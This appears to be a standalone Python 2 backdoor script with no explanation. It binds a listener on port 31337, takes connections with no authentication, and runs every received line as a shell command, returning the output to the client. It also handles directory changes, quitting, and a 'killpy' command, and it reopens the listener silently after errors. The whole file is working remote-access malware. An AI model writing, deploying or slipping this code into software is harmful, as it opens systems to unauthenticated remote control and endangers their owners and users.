#!/usr/bin/env python

import socket
import pwd
import os
import thread
import subprocess
import sys

PORT=31337

def connection(conn):
	user = pwd.getpwuid(os.getuid()).pw_name
	host = socket.gethostname()
	conn.setblocking(1)
	while True:
		user = pwd.getpwuid(os.getuid()).pw_name
		host = socket.gethostname()
		path = os.getcwd()
		conn.send('[{}@{}:{}]> '.format(user, host, path))
		data = conn.recv(1024)
		if data.strip('\r\n') == 'quit' or data.strip('\r\n') == 'exit':
			conn.close()
			break
		elif data.strip('\r\n').startswith('killpy'):
			os.system('kill -9 {}'.format(os.getpid()))
		elif data.strip('\r\n').startswith('cd'):
			try: os.chdir(data.strip('\r\n')[3:])
			except: conn.send('Path not found!\n')
		else:
			proc = subprocess.Popen(data.strip('\r\n'), shell=True, stdout = subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE)
			stdoutput = proc.stdout.read() + proc.stderr.read()
			conn.send(stdoutput)

while True:
	try:
		s = socket.socket()
		s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
		s.bind(('', PORT))
		s.listen(5)
		while True:
			s.settimeout(2)
			try: conn, addr = s.accept()
			except socket.timeout: continue
			if(conn):
				s.settimeout(None)
				thread.start_new_thread(connection, (conn,))
	except: pass
